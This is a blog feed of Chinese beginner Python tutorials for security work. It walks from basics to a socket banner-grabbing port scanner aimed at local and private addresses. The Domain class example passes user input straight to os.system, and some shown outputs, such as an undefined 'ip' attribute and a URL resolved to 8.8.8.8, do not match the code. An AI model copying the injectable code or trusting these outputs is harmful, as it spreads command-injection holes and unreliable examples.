class="string">'Connection refused'</span>)</div></pre></div></div></figure><p>对于上面的错误有若干中处理方式，这里我们使用最简单的一种方式：使用<code>try/except</code>循环来处理错误:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">try</span>:</div><div class="line"><span class="meta">... </span>  s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">23</span>))</div><div class="line"><span class="meta">... </span><span class="keyword">except</span>: <span class="keyword">pass</span></div><div class="line">...</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>现在就不会出现错误了，一行很简单的代码就让你的程序能够继续工作下去^_^。现在让我们使用之前学到的知识，使用for循环来写一个简单的端口扫描器:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">20</span>,<span class="number">25</span>):</div><div class="line"><span class="meta">... </span>  <span class="keyword">try</span>:</div><div class="line"><span class="meta">... </span>   <span class="keyword">print</span> <span class="string">"[+] Attempting to connect to 127.0.0.1:"</span>+str(port)</div><div class="line"><span class="meta">... </span>    s.connect((<span class="string">'127.0.0.1'</span>, port))</div><div class="line"><span class="meta">... </span>    s.send(<span class="string">'Primal Security \n'</span>)    </div><div class="line"><span class="meta">... </span>    banner = s.recv(<span class="number">1024</span>)</div><div class="line"><span class="meta">... </span>    <span class="keyword">if</span> banner:</div><div class="line"><span class="meta">... </span>      <span class="keyword">print</span> <span class="string">"[+] Port "</span>+str(port)+<span class="string">" open: "</span>+banner</div><div class="line"><span class="meta">... </span>    s.close()</div><div class="line"><span class="meta">... </span>  <span class="keyword">except</span>: <span class="keyword">pass</span></div><div class="line">...</div><div class="line"><span class="number">17</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">20</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">21</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span></div><div class="line">[+] Port <span class="number">22</span> open: OpenSSH</div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">23</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">24</span></div><div class="line">[+] Attempting to connect to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">25</span></div></pre></div></div></figure><p>上面我们演示了使用<code>try/except</code>循环来处理当socket连接的时候遇到端口关闭的错误，同时上面还演示了如何使用”if”语句打印出可以连接成功的端口。下面我们将创建一个我们扫描指定端口的扫描器，这里的端口号，我们使用数组来存储，然后遍历这一个数组:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ports = [<span class="number">22</span>, <span class="number">445</span>, <span class="number">80</span>, <span class="number">443</span>, <span class="number">3389</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="meta">... </span>  <span class="keyword">print</span> port</div><div class="line">...</div><div class="line"><span class="number">22</span></div><div class="line"><span class="number">445</span></div><div class="line"><span class="number">80</span></div><div class="line"><span class="number">443</span></div><div class="line"><span class="number">3389</span></div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>如果我们想一次性扫描多台主机，可以使用一个for循环嵌套。最外层的是主机的ip，然后里面的for循环是端口。下面有一个基础的例子，展示了如何通过循环嵌套来构建一个简单的扫描器:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>hosts = [<span class="string">'127.0.0.1'</span>, <span class="string">'192.168.1.5'</span>, <span class="string">'10.0.0.1'</span>]</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ports = [<span class="number">22</span>, <span class="number">445</span>, <span class="number">80</span>, <span class="number">443</span>, <span class="number">3389</span>]</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> host <span class="keyword">in</span> hosts:</div><div class="line"><span class="meta">... </span>  <span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="meta">... </span>    <span class="keyword">try</span>:</div><div class="line"><span class="meta">... </span>       <span class="keyword">print</span> <span class="string">"[+] Connecting to "</span>+host+<span class="string">":"</span>+str(port)</div><div class="line"><span class="meta">... </span>       s.connect((host, port))</div><div class="line"><span class="meta">... </span>       s.send(<span class="string">'Primal Security \n'</span>)</div><div class="line"><span class="meta">... </span>       banner = s.recv(<span class="number">1024</span>)</div><div class="line"><span class="meta">... </span>       <span class="keyword">if</span> banner:</div><div class="line"><span class="meta">... </span>         <span class="keyword">print</span> <span class="string">"[+] Port "</span>+str(port)+<span class="string">" open: "</span>+banner</div><div class="line"><span class="meta">... </span>       s.close()</div><div class="line"><span class="meta">... </span>    <span class="keyword">except</span>:<span class="keyword">pass</span></div><div class="line">...</div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span></div><div class="line">[+] Port <span class="number">22</span> open: OpenSSH</div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">445</span></div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span></div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span></div><div class="line">[+] Connecting to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3389</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">22</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">445</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">80</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">443</span></div><div class="line">[+] Connecting to <span class="number">192.168</span><span class="number">.1</span><span class="number">.5</span>:<span class="number">3389</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">22</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">445</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">80</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">443</span></div><div class="line">[+] Connecting to <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">3389</span></div></pre></div></div></figure><p>正如你所看到的结果，它把<code>hosts</code>数组里面的所有值都遍历了一次<code>ports</code>数组，等<strong>hosts[0]</strong>扫描完成之后再扫描<strong>hosts[1]</strong>依次类推。在这个例子里面你也可以修改里面的代码，只让它显示出可以打开的端口。</p><blockquote><p>在这最后，你会发现还是Nmap最好用，但是我们将在后面的文章里面继续完善这个实例，大家可以花点时间去学习一些socket模块其他的功能函数，大家可以使用<code>dir(socket)</code>来了解更多，当然还有<code>help()</code>.下一章</p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python黑客之旅0x1</title>
      <link href="/2015/10/13/pythonhacker_0x1/"/>
      <url>/2015/10/13/pythonhacker_0x1/</url>
      <content type="html"><![CDATA[<h1 id="入门-2"><a href="#入门-2" class="headerlink" title="入门(2)"></a>入门(2)</h1><p>这一章将继续讲解一些基础的Python脚本概念,我们将把代码写入到一个脚本里面，函数，类和sys模块。</p><a id="more"></a><h2 id="Python脚本框架"><a href="#Python脚本框架" class="headerlink" title="Python脚本框架"></a>Python脚本框架</h2><p>下面是一个开始写Python脚本的基础例子，开始部分，我么告诉系统需要使用那一个解释器”#!/usr/bin/env python”,然后我们通过”def main():”声明一个main函数,最后2行代码有mian()的先执行。你可以定义在你的脚本里面定义其它函数，这样使得你的代码更容易的理解和修改维护：</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> &lt;module1&gt;, &lt;module2&gt;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">myFunction</span><span class="params">()</span>:</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">        myFunction()</div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">        main()</div></pre></div></div></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p> 一种常见的写法是把每个功能函数分开写，执行一些操作之后然后返回结果。下面的这个伪代码演示的例子就能够很清晰的解释这个概念:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># 声明函数/逻辑处理</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">MyFunction</span>:</span></div><div class="line">  ...do work...</div><div class="line">  <span class="keyword">return</span> output</div><div class="line"> </div><div class="line"><span class="comment">#在main函数里面调用:</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">  output = MyFunction(input)</div></pre></div></div></figure><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>Python类开始使用的时候会有点困难，因为它是教你以何种方式设计你的代码，如果你掌握类的概念那么你就可以把数据和定义按照类的逻辑分组，这样类就拥有了属性和与之想关联的方法。当你定义一个类之后，你可以创建一个新的类，然后继承之前创建的类的属性和与之相关联的方法，这编程就叫做面向对象编程。</p><p>如果你感到迷惑，那么我建议你先不要去学习类，实际上，你并不需要类。但它可以让你的代码减少冗余。下面我们将定义个新的类”Domain”使用”class”关键字，当你实例化Domain类型对象的时候，它的类型有多种方式去定义:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Domain</span>:</span></div><div class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, domain, port, protocol)</span>:</span></div><div class="line"><span class="comment">#通过两个内部变量存储变量</span></div><div class="line"><span class="meta">... </span>      self.domain=domain</div><div class="line"><span class="meta">... </span>      self.port=port</div><div class="line"><span class="meta">... </span>      self.protocol=protocol</div><div class="line"><span class="comment">#构造一个url的方法</span></div><div class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">URL</span><span class="params">(self)</span>:</span></div><div class="line"><span class="meta">... </span>      <span class="keyword">if</span> self.protocol == <span class="string">'https'</span>:</div><div class="line"><span class="meta">... </span>        URL = <span class="string">'https://'</span>+self.domain+<span class="string">':'</span>+self.port+<span class="string">'/'</span></div><div class="line"><span class="meta">... </span>      <span class="keyword">if</span> self.protocol == <span class="string">'http'</span>:</div><div class="line"><span class="meta">... </span>        URL = <span class="string">'http://'</span>+self.domain+<span class="string">':'</span>+self.port+<span class="string">'/'</span></div><div class="line"><span class="meta">... </span>        <span class="keyword">return</span> URL</div><div class="line"><span class="comment"># 调用os.system中主机命令lookup去解析域名</span></div><div class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">lookup</span><span class="params">(self)</span>:</span></div><div class="line"><span class="meta">... </span>      os.system(<span class="string">"host "</span>+self.domain)</div><div class="line">...</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain=Domain(<span class="string">'google.com'</span>, <span class="string">'443'</span>, <span class="string">'https'</span>)</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(domain)</div><div class="line">[<span class="string">'URL'</span>, <span class="string">'__doc__'</span>, <span class="string">'__init__'</span>, <span class="string">'__module__'</span>, <span class="string">'ip'</span>, <span class="string">'lookup'</span>, <span class="string">'port'</span>, <span class="string">'protocol'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.URL()</div><div class="line"><span class="string">'https://8.8.8.8:443/'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.ip</div><div class="line"><span class="string">'8.8.8.8'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.port</div><div class="line"><span class="string">'443'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.protocol</div><div class="line"><span class="string">'https'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain.lookup()</div><div class="line">google.com has address <span class="number">74.125</span><span class="number">.228</span><span class="number">.233</span></div><div class="line">google.com has address <span class="number">74.125</span><span class="number">.228</span><span class="number">.227</span></div><div class="line">google.com has address <span class="number">74.125</span><span class="number">.228</span><span class="number">.232</span></div></pre></div></div></figure><p>正如你所看到的，当你实例化一个Domian类之后你可以运行类中的方法。再次说声，这个概念最初的时候很容易混乱，尤其是当你刚刚Python和编程的时候。尝试一下去实现一个新的类在你的Python脚本里面，我发现这是掌握这个概念最好的途径。</p><h2 id="使用sys处理命令行输入值"><a href="#使用sys处理命令行输入值" class="headerlink" title="使用sys处理命令行输入值"></a>使用sys处理命令行输入值</h2><p>最好我们来介绍一下sys模块，它可以让你读取从命令终端输入的值并且帮你引入到脚本里面，它的语法很简单，sys.agrv[0]就是一个实际的脚本名，并在命令行指定的每个参数后面分配一个下标。下面是一个简单的例子:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">script = sys.argv[<span class="number">0</span>]</div><div class="line">ip = sys.argv[<span class="number">1</span>]</div><div class="line">port = sys.argv[<span class="number">2</span>]</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"[+] The script name is: "</span>+script</div><div class="line"><span class="keyword">print</span> <span class="string">"[+] The IP is: "</span>+ip+<span class="string">" and the port is: "</span>+port</div></pre></div></div></figure><p>当执行这个脚本的时候，并且后面跟三个参数执行之后的结果如下:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">~$ python sys.py <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="number">53</span></div><div class="line">[+] The script name <span class="keyword">is</span>: sys.py</div><div class="line">[+] The IP <span class="keyword">is</span>: <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span> <span class="keyword">and</span> the port <span class="keyword">is</span>: <span class="number">53</span></div></pre></div></div></figure><blockquote><p>上面的只是一个例子，大家可以继续去研究其它Python模块，因为它们能够放你用最简单的方式解决你遇到的问题。下一章将会介绍使用Python进行网络连接并且写出一个基础的扫描器.</p></blockquote>]]></content>
      
      <categories>
          
          <category> Python </category>
          
          <category> Hacker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python黑客之旅0x0</title>
      <link href="/2015/10/12/pythonhacker_0x0/"/>
      <url>/2015/10/12/pythonhacker_0x0/</url>
      <content type="html"><![CDATA[<h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p> 这将是第一个一系列关于python编程的博客文章。python是一门非常强大的语言，因为它有信息安全社区的支撑。这意味着很多工具都是由python编写并且可以在脚本中调用很多模块。使用模块的好处就是只需要少量的代码就能够完成所需的任务。</p><p> 这篇文章假定你的系统是Linux，python版本是2.*。在写代码的时候你也可以直接的写在解释器里面(linux里面输入python即可进入)，也可以把代码放到一个文件里面。很多人会发现把代码存放到文件里面要比直接写在解释器上面要好很多。值得注意的是python 中强制缩进。大家在写函数声明，循环，if/else语句等等的时候就会发现。</p><a id="more"></a><h3 id="python解释器"><a href="#python解释器" class="headerlink" title="python解释器"></a>python解释器</h3><p>在终端里面输入python:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">~$ python</div><div class="line">Python <span class="number">2.7</span><span class="number">.6</span> (default, Mar <span class="number">22</span> <span class="number">2014</span>, <span class="number">22</span>:<span class="number">59</span>:<span class="number">56</span>) </div><div class="line">[GCC <span class="number">4.8</span><span class="number">.2</span>] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>输入之后你就可以直接在解释器里面写你的代码了。下面我们将声明两个变量，并且使用type()函数查看变量的类型。假设我们声明了一个字符串和整型：</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>ip = <span class="string">'8.8.8.8'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>port = <span class="number">53</span></div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(ip)</div><div class="line">&lt;type <span class="string">'str'</span>&gt;</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>type(port)</div><div class="line">&lt;type <span class="string">'int'</span>&gt;</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>你可以使用内置的help()函数去了解一个函数的详细。记住这一点，它可以帮助你在学习语言的时候学习到更多的详细内容.</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>help(type)</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><p>有时你会想把一些变量和字符串连接起来然后通过脚本显示出来。那么你就需要使用str()函数把整型转换成字符串类型</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>ip=<span class="string">'1.1.1.1'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>port=<span class="number">55</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">'the ip is:'</span>+ip+<span class="string">'and the port is:'</span>+str(port)</div><div class="line">the ip <span class="keyword">is</span>:<span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span><span class="keyword">and</span> the port <span class="keyword">is</span>:<span class="number">55</span></div></pre></div></div></figure><p>前面声明变量的时候”IP”就是一个字符串就不需要转换，而”port”就需要。现在你就已经知道了两个基本的数据类型(string和integer)。现在你可以试试使用内置函数与这两个数据类型写出其他的代码。</p><p>Python字符串允许你通过偏移值来获取你想需要的字符串,并且可以通过len()函数来获取字符串的长度，它可以帮助你更方便的操作字符串。</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain=<span class="string">'primalsecurity.net'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain</div><div class="line"><span class="string">'primalsecurity.net'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain[<span class="number">0</span>]</div><div class="line"><span class="string">'p'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain[<span class="number">0</span>:<span class="number">3</span>]</div><div class="line"><span class="string">'pri'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>domain[<span class="number">1</span>:]</div><div class="line"><span class="string">'rimalsecurity.net'</span></div><div class="line"> </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>len(domain)</div><div class="line"><span class="number">18</span></div></pre></div></div></figure><p>你可以使用内建的dir()函数来列出模块定义的标识符。标识符有函数、类和变量。</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(ip)</div><div class="line">[<span class="string">'__add__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__getnewargs__'</span>, <span class="string">'__getslice__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__mod__'</span>, <span class="string">'__mul__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__rmod__'</span>, <span class="string">'__rmul__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'_formatter_field_name_split'</span>, <span class="string">'_formatter_parser'</span>, <span class="string">'capitalize'</span>, <span class="string">'center'</span>, <span class="string">'count'</span>, <span class="string">'decode'</span>, <span class="string">'encode'</span>, <span class="string">'endswith'</span>, <span class="string">'expandtabs'</span>, <span class="string">'find'</span>, <span class="string">'format'</span>, <span class="string">'index'</span>, <span class="string">'isalnum'</span>, <span class="string">'isalpha'</span>, <span class="string">'isdigit'</span>, <span class="string">'islower'</span>, <span class="string">'isspace'</span>, <span class="string">'istitle'</span>, <span class="string">'isupper'</span>, <span class="string">'join'</span>, <span class="string">'ljust'</span>, <span class="string">'lower'</span>, <span class="string">'lstrip'</span>, <span class="string">'partition'</span>, <span class="string">'replace'</span>, <span class="string">'rfind'</span>, <span class="string">'rindex'</span>, <span class="string">'rjust'</span>, <span class="string">'rpartition'</span>, <span class="string">'rsplit'</span>, <span class="string">'rstrip'</span>, <span class="string">'split'</span>, <span class="string">'splitlines'</span>, <span class="string">'startswith'</span>, <span class="string">'strip'</span>, <span class="string">'swapcase'</span>, <span class="string">'title'</span>, <span class="string">'translate'</span>, <span class="string">'upper'</span>, <span class="string">'zfill'</span>]</div></pre></div></div></figure><p>现在你可以使用上面列举出来的内建字符串函数，如果想知道这个函数的更多描述可以参考前面提到的help()函数:</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>help(ip.split)</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>string = ip+<span class="string">':'</span>+str(port)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>string</div><div class="line"><span class="string">'8.8.8.8:53'</span></div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>string.split(<span class="string">':'</span>)</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>]</div></pre></div></div></figure><p>这split函数把一个字符串通过”:”切割生成一个新的列表。这是一个非常有用的字符串函数因为你能够把这个字符串里面的有用信息提出出来。例如，你获取到了一个ip列表，你想在这个列表里面添加一个索引值。你也可以删除和添加新的值到这个列表里面通过.append()和.remove()函数</p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list = string.split(<span class="string">':'</span>)</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>]</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list[<span class="number">0</span>]</div><div class="line"><span class="string">'8.8.8.8'</span></div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list.append(<span class="string">'google'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>, <span class="string">'google'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list.remove(<span class="string">'google'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>list</div><div class="line">[<span class="string">'8.8.8.8'</span>, <span class="string">'53'</span>]</div><div class="line">&gt;&gt;&gt;</div></pre></div></div></figure><h3 id="Python模块"><a href="#Python模块" class="headerlink" title="Python模块"></a>Python模块</h3><p>在上面提到过，Python模块能够让你用少量的代码就能够完成你的任务,Python有许多有用的内建模块(os,subprocess,socket,urllib,httplib,re,sys等等)和第三方模块(cymruwhois,scapy,dpkt,spider等等).使用Python模块很简单”import <modulenmae>“. OS模块是非常重要的因为你需要在你的Python代码里面调用系统命令:</modulenmae></p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</div><div class="line">&gt;&gt;&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(os)</div><div class="line">[<span class="string">'EX_CANTCREAT'</span>, <span class="string">'EX_CONFIG'</span>, <span class="string">'EX_DATAERR'</span>, <span class="string">'EX_IOERR'</span>, <span class="string">'EX_NOHOST'</span>, <span class="string">'EX_NOINPUT'</span>, <span 